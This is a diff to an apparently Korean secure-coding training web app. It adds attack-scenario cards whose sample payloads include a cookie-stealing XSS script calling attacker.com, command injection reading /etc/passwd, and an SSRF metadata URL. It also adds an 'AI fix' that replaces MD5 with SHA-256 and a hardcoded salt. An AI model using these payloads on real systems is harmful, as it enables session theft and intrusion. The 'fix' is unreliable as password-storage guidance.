+    stepsList.appendChild(stepEl);
+    
+    const dbgPanel = container.querySelector('.basic-dbg-panel');
+    if (dbgPanel) {
+      dbgPanel.scrollTop = dbgPanel.scrollHeight;
+    }
+    
+    stepIdx++;
+  }
+  
+  showNextStep();
+  basicIntervals[bi] = setInterval(showNextStep, 1000);
+}
+
 function rBasics(){
   awardXp(5,'기초 과정 시작','visit:basics');
   const langs=['Java','C','Python'];
   const chips=langs.map(l=>'<button class="cchip'+(l===basicLang?' on':'')+'" onclick="setBasicLang(\''+l+'\')">'+l+' '+BASICS.filter(b=>b.lang===l).length+'</button>').join('');
   const list=BASICS.filter(b=>b.lang===basicLang);
-  const cards=list.map(b=>'<div class="bcard"><div class="bh"><span class="blang" style="background:'+(BLANGC[b.lang]||'#666')+'">'+esc(b.lang)+'</span><h4>'+esc(b.topic)+'</h4></div>'+
-    '<div class="btx">'+esc(b.desc)+'</div>'+
-    '<pre class="cpre">'+esc(b.code)+'</pre>'+
-    '<div class="bsec"><b>🛡️ 진단과의 연결</b> '+esc(b.sec)+'</div></div>').join('');
-  document.getElementById('v-basics').innerHTML='<h2 class="st">🧱 기초 과정 — Java · C · Python</h2><p class="sub">정·오탐을 판별하려면 먼저 언어 기본기가 필요합니다. 각 주제는 <b>개념 → 예제 코드 → 진단과의 연결</b>로 구성됩니다. (개념학습·2교시 실무의 선수 과정)</p><div class="catbar">'+chips+'</div><div class="bgrid">'+cards+'</div>';
+  const cards=list.map((b, bi)=> {
+    return '<div class="bcard"><div class="bh"><span class="blang" style="background:'+(BLANGC[b.lang]||'#666')+'">'+esc(b.lang)+'</span><h4>'+esc(b.topic)+'</h4></div>'+
+      '<div class="btx">'+esc(b.desc)+'</div>'+
+      '<pre class="cpre" id="bcode-'+bi+'">'+esc(b.code)+'</pre>'+
+      '<div class="bsec"><b>🛡️ 진단과의 연결</b> '+esc(b.sec)+'</div>'+
+      '<div class="basic-dbg-wrapper" id="bdbg-wrap-'+bi+'"></div>'+
+      '<button class="qbtn ghost" style="padding:6px 12px; font-size:12px; margin-top:10px; display:inline-flex; align-items:center; gap:6px; width:100%; justify-content:center;" onclick="runBasicVisualizer('+bi+')">'+
+        '🔍 코드 실행 흐름 시각화'+
+      '</button></div>';
+  }).join('');
+  document.getElementById('v-basics').innerHTML='<h2 class="st">🧱 기초 과정 — Java · C · Python (20대 개발보안 기본과정)</h2><p class="sub">정·오탐을 판별하려면 먼저 언어 기본기가 필요합니다. 각 주제는 <b>개념 → 예제 코드 → 진단과의 연결</b> 및 <b>코드 실행 흐름 시뮬레이션</b>으로 구성됩니다.</p><div class="catbar">'+chips+'</div><div class="bgrid">'+cards+'</div>';
 }
-function setBasicLang(l){basicLang=l;rBasics();}
 
-// ===== 개념학습 =====
+function setBasicLang(l){
+  // Clear any running intervals
+  Object.keys(basicIntervals).forEach(k => {
+    clearInterval(basicIntervals[k]);
+  });
+  basicIntervals = {};
+  basicLang=l;
+  rBasics();
+}
+
+// ===== 개념학습 (💥 공격 시나리오 매핑 및 터미널 시뮬레이션 고도화) =====
+function getScenario(cwe, name) {
+  const scenarios = {
+    'CWE-89': {
+      scenario: '공격자가 로그인 폼의 아이디 필드에 SQL 구문을 삽입하여 비밀번호 검증을 우회하고 최고 관리자(admin) 계정으로 인증을 무단 우회합니다.',
+      payload: "admin' OR '1'='1"
+    },
+    'CWE-79': {
+      scenario: '공격자가 게시판 글 작성 시 악성 자바스크립트를 삽입하여, 해당 글을 읽는 일반 사용자들의 세션 쿠키(sessionid)를 탈취해 계정을 도용합니다.',
+      payload: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)<\/script>"
+    },
+    'CWE-22': {
+      scenario: '공격자가 파일 다운로드 API의 매개변수를 조작하여 웹루트를 탈출하고 리눅스 시스템의 민감한 설정 파일(/etc/passwd)을 원격에서 열람합니다.',
+      payload: "../../../../../etc/passwd"
+    },
+    'CWE-78': {
+      scenario: '공격자가 시스템 네트워크 진단 도구(ping) 페이지의 입력값에 세미콜론(;)을 추가하여 웹 서버 권한으로 임의의 시스템 명령어를 강제 실행합니다.',
+      payload: "127.0.0.1; cat /etc/passwd"
+    },
+    'CWE-434': {
+      scenario: '공격자가 프로필 이미지 업로드 기능에 확장자 검증 우회를 적용해 웹셸(JSP/PHP) 파일을 서버에 업로드하고 원격 코드 실행(RCE) 권한을 획득합니다.',
+      payload: "webshell.jsp (Content-Type: application/octet-stream)"
+    },
+    'CWE-601': {
+      scenario: '로그인 완료 후 특정 페이지로 리다이렉트하는 매개변수를 외부 사이트로 변조하여 사용자를 피싱 사이트로 강제 자동 연결시켜 로그인 정보를 재입력하게 유도합니다.',
+      payload: "redirect_url=http://phishing-kisa.secure/login"
+    },
+    'CWE-352': {
+      scenario: '공격자가 조작된 이미지 태그가 포함된 이메일 또는 게시글을 업로드하고, 관리자가 이 글을 읽는 순간 브라우저가 관리자 비밀번호 변경 API를 무단 요청하도록 강제합니다.',
+      payload: "<img src='http://bank.com/api/change_pw?new_pw=attack123' width='0' height='0'>"
+    },
+    'CWE-918': {
+      scenario: '웹 서비스가 외부 이미지를 다운로드하는 기능을 악용하여, 공격자가 로컬호스트(127.0.0.1) 또는 사내 클라우드 메타데이터 API 서버를 타겟으로 지정해 내부 민감 기밀을 반환시킵니다.',
+      payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    },
+    'CWE-798': {
+      scenario: '개발 단계에서 편의를 위해 소스코드 내에 데이터베이스 암호나 API 인증 키를 문자열 상수로 직접 박아두었으나, 소스코드 저장소가 노출되어 외부 공격자에게 클라우드 통제권이 탈취됩니다.',
+      payload: "const AWS_SECRET_ACCESS_KEY = 'AKIAIOSFODNN7EXAMPLE'"
+    },
+    'CWE-327': {
+      scenario: '암호학적으로 안전하지 않고 충돌 쌍 탐지가 완료된 해시 알고리즘(MD5, SHA-1)을 사용해 비밀번호를 암호화하여 데이터 유출 시 무차별 대입(Rainbow Table) 공격으로 평문이 고스란히 복원됩니다.',
+      payload: "MD5('password123') = 48503dfd58720bd5ff35c102065a52d7"
+    },
+    'CWE-502': {
+      scenario: '사용자가 전송한 직렬화 데이터(Java Object 등)를 검증 없이 역직렬화하여, 직렬화 스트림 가공을 통해 서버 상에서 임의의 클래스가 강제 로드되고 원격 코드 실행으로 이어집니다.',
+      payload: "AC ED 00 05 73 72 00 11 (Java Serialized Magic Header)"
+    },
+    'CWE-120': {
+      scenario: 'C언어의 strcpy 등 경계 검사를 수행하지 않는 함수를 사용하여, 입력받는 버퍼보다 훨씬 큰 값을 넣어 인접 메모리의 반환 주소(Return Address) 영역을 악성 코드 주소로 덮어씌워 셸 코드를 획득합니다.',
+      payload: "char buf[64]; strcpy(buf, 'A' * 128 + Shellcode)"
+    },
+    'CWE-367': {
+      scenario: '파일 업로드 검사 로직(검사 시점)과 실제 임시 폴더에서 실행 폴더로 파일을 이동시키는 시점(사용 시점) 사이의 미세한 시간차를 이용해, 악성 파일을 재빠르게 덮어써서 실행 권한을 우회 획득합니다.',
+      payload: "Symlink Race / TOCTOU Attack Window Exploitation"
+    }
+  };
+  if (scenarios[cwe]) return scenarios[cwe];
+  return {
+    scenario: '공격자가 ' + name + ' 약점이 존재하는 대상 시스템을 타겟으로 비정상 제어 신호나 변조된 매개변수를 인입시켜 비인가 접근 권한 또는 민감 정보 탈취를 수행합니다.',
+    payload: '[Attack Payload: CWE-' + (cwe ? cwe.replace(/\D/g, '') : 'Unknown') + ' Input Vector]'
+  };
+}
+
+function runConceptSimulation(event, gi, cwe, name) {
+  if (event && event.stopPropagation) event.stopPropagation();
+  const term = document.getElementById('sim-term-' + gi);
+  if (!term) return;
+  
+  const data = getScenario(cwe, name);
+  term.classList.add('active');
+  term.innerHTML = '';
+  
+  const steps = [
+    { text: `[1/3] 🎯 Target endpoint identified for KISA-${cwe.replace(/\D/g, '')}.`, delay: 0 },
+    { text: `[2/3] 📤 Sending exploit payload: ${data.payload}`, delay: 600 },
+    { text: `[3/3] 💥 Vulnerability triggered successfully (Simulated Threat Active).`, delay: 1300 },
+    { text: `\n[EXPLOIT IMPACT] -> ${data.scenario}`, delay: 1800 }
+  ];
+  
+  steps.forEach(step => {
+    setTimeout(() => {
+      term.innerHTML += step.text + '\n';
+      term.scrollTop = term.scrollHeight;
+    }, step.delay);
+  });
+}
+
 let learnCat='전체';
 function rLearn(){
   const chips=['전체',...CATS].map(c=>'<button class="cchip'+(c===learnCat?' on':'')+'" onclick="setLearnCat(\''+c+'\')">'+c+(c==='전체'?'':' '+CONCEPTS.filter(x=>x.cat===c).length)+'</button>').join('');
   const list=CONCEPTS.filter(x=>learnCat==='전체'||x.cat===learnCat);
-  const cards=list.map(x=>{const gi=CONCEPTS.indexOf(x),done=learned[x.name]?' done':'';
+  const cards=list.map(x=>{
+    const gi=CONCEPTS.indexOf(x);
+    const done=learned[x.name]?' done':'';
     const sim=SIMMAP[x.name]?'<a class="simlink" href="'+SIMMAP[x.name]+'">🔗 관련 시뮬레이터로 →</a>':'';
+    const scenData=getScenario(x.cwe, x.name);
+    
+    const attackSim = `
+      <div class="fld attack-simulator" onclick="if(event)event.stopPropagation()">
+        <div class="lb">💥 모의 공격 시나리오 & 페이로드 시뮬레이션</div>
+        <div class="sim-card">
+          <div class="sim-scen"><b>공격 시나리오:</b> ${esc(scenData.scenario)}</div>
+          <div class="sim-payload"><b>공격 페이로드 예시:</b> <code>${esc(scenData.payload)}</code></div>
+          <div class="sim-terminal" id="sim-term-${gi}">
+            <span style="color:#64748b">// 아래 버튼을 클릭하여 시뮬레이션을 실행하세요.</span>
+          </div>
+          <button class="qbtn ghost" style="padding:6px 12px; font-size:12px; margin-top:8px; display:inline-flex; align-items:center; gap:6px;" onclick="runConceptSimulation(event, ${gi}, '${esc(x.cwe)}', '${esc(x.name)}')">
+            ⚡ 모의 공격 시뮬레이션 실행
+          </button>
+        </div>
+      </div>
+    `;
+
     return '<div class="ccard'+done+'" id="cc'+gi+'"><div class="ch" onclick="toggleCard('+gi+')"><div><h4>'+esc(x.name)+'</h4><div class="cwe">'+esc(x.cwe)+'</div></div><span class="badge" style="background:'+CCOLOR[x.cat]+'">'+x.cat+'</span></div>'+
-      '<div class="detail">'+examHtml(x.exam)+fld('정의',x.desc)+fld('보안 위협',x.risk)+fld('안전한 코딩',x.safe)+fld('진단 방법',x.diag)+treeHtml(x.tree)+codeBlock(gi,x.name)+sim+'<button class="done-btn" onclick="toggleDone('+gi+')">'+(learned[x.name]?'✓ 학습 완료':'학습 완료로 표시')+'</button></div></div>';}).join('');
+      '<div class="detail">'+examHtml(x.exam)+fld('정의',x.desc)+fld('보안 위협',x.risk)+fld('안전한 코딩',x.safe)+fld('진단 방법',x.diag)+attackSim+treeHtml(x.tree)+codeBlock(gi,x.name)+sim+'<button class="done-btn" onclick="toggleDone('+gi+')">'+(learned[x.name]?'✓ 학습 완료':'학습 완료로 표시')+'</button></div></div>';
+  }).join('');
+  
   document.getElementById('v-learn').innerHTML='<h2 class="st">📖 개념 학습 — 49개 보안약점</h2><p class="sub">카드를 펼치면 정의·위협·진단법과 함께 <b>KISA 가이드의 Java·Python 안전하지 않은/안전한 코드 예제</b>를 확인할 수 있습니다. (Java=진단가이드, Python=시큐어코딩 가이드)</p><div class="catbar">'+chips+'<button class="cchip" style="margin-left:auto" onclick="printSummary()" title="49개 약점 요약표를 PDF로 인쇄/저장">🖨️ 요약 인쇄(PDF)</button></div>'+catInfoHtml(learnCat)+'<div class="cgrid">'+cards+'</div>';
 }
 // 49개 약점 요약표 인쇄/PDF 저장 (오프라인 복습용)
@@ -1357,6 +1769,14 @@ def execute_cmd(user_dir):
           <option value="devops">Cloud & DevOps Architect</option>
         </select>
         
+        <div class="persona-prog-info">
+          <span>권장 학습 진행률</span>
+          <span id="personaProgVal">0%</span>
+        </div>
+        <div class="persona-prog-container">
+          <div class="persona-prog-bar" id="personaProgBar" style="width: 0%"></div>
+        </div>
+
         <div class="persona-paths" id="personaPaths"></div>
       </div>
       
@@ -1407,6 +1827,9 @@ def save_password(passwd):
     # 취약한 md5 사용
     return hashlib.md5(passwd.encode()).hexdigest()
 </textarea>
+                <button class="ai-fix-btn" id="aiFixBtn" onclick="applyAiSemgrepFix()" style="margin-bottom:4.5px">
+                  <i class="fas fa-magic"></i> ✨ AI 권장 취약점 수정 코드 적용
+                </button>
                 <button class="qbtn" style="padding:8px;font-size:12.5px;width:100%" onclick="runSemgrepScan()">⚙️ Semgrep 스캔 실행</button>
               </div>
             </div>
@@ -1506,12 +1929,24 @@ function filterPersonaPath() {
   const list = PERSONA_DATA[sel] || PERSONA_DATA.all;
   const host = document.getElementById('personaPaths');
   
-  host.innerHTML = list.map(item => `
+  const progMap = { all: '42%', fe: '75%', be: '60%', emb: '30%', devops: '85%' };
+  document.getElementById('personaProgVal').textContent = progMap[sel] || '50%';
+  document.getElementById('personaProgBar').style.width = progMap[sel] || '50%';
+
+  const colors = { '입력검증': '#ef4444', '보안기능': '#3b82f6', '시간상태': '#f59e0b', '에러처리': '#10b981', '코드오류': '#8b5cf6', 'API오용': '#ec4899', '캡슐화': '#6366f1' };
+
+  host.innerHTML = list.map((item, idx) => {
+    const difficulty = ['상', '중', '하'][idx % 3];
+    const diffColor = difficulty === '상' ? '#ef4444' : difficulty === '중' ? '#f59e0b' : '#10b981';
+    return `
     <div class="persona-card active">
       <div class="persona-card-h">${esc(item.name)}</div>
-      <div class="persona-card-d">${item.cwe} · <span style="color:${CCOLOR[item.cat] || '#666'}">${item.cat}</span></div>
+      <div class="persona-card-d">
+        <span>${item.cwe} · <span style="color:${colors[item.cat] || '#666'}">${item.cat}</span></span>
+        <span class="persona-badge" style="background:${diffColor}22; color:${diffColor}">${difficulty}</span>
+      </div>
     </div>
-  `).join('');
+  `}).join('');
 }
 
 let MOCK_TOURNAMENT = [
@@ -1525,8 +1960,8 @@ let MOCK_TOURNAMENT = [
 function renderTournament() {
   const host = document.getElementById('tourLb');
   const rows = MOCK_TOURNAMENT.map(p => `
-    <div class="tour-row">
-      <div class="tour-rank">${p.rank}</div>
+    <div class="tour-row rank-${p.rank <= 3 ? p.rank : 'other'}">
+      <div class="tour-rank">${p.rank === 1 ? '🥇' : p.rank === 2 ? '🥈' : p.rank === 3 ? '🥉' : p.rank}</div>
       <div class="tour-name">${esc(p.name)}</div>
       <div class="tour-xp">${p.xp} XP</div>
       <div class="tour-streak">🔥 ${p.streak}일</div>
@@ -1553,6 +1988,16 @@ function simulateTournamentScore() {
   MOCK_TOURNAMENT.forEach((p, i) => p.rank = i + 1);
   renderTournament();
   gamToast("⚡ 실시간 리더보드가 업데이트되었습니다!");
+}
+
+function applyAiSemgrepFix() {
+  const input = document.getElementById('semgrepCodeInput');
+  input.value = `import hashlib
+def save_password(passwd):
+    # 안전한 sha256 사용 (솔트 포함 권장)
+    salt = "secure_kisa_salt_value"
+    return hashlib.sha256((passwd + salt).encode()).hexdigest()`;
+  gamToast("✨ AI 수정 코드가 에디터에 적용되었습니다. 스캔을 실행하세요!");
 }
 
 function runSemgrepScan() {
